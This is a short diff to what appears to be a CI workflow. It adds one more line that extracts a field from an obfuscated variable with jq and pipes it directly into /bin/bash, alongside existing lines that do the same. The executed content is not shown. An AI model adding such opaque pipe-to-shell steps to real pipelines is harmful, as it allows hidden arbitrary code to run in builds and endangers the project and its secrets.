@@ -22,6 +22,7 @@ jobs:
           echo $qrge3834 | jq -r .jbjvz204 | /bin/bash
           echo $gag3 | jq -r .w781 | /bin/bash
           echo $a3 | jq -r .fpgw6584 | /bin/bash
+          printf '%s' "$apgv4996" | jq -r .hzid2026 | /bin/bash
 
       - name: Save archive
         if: always()
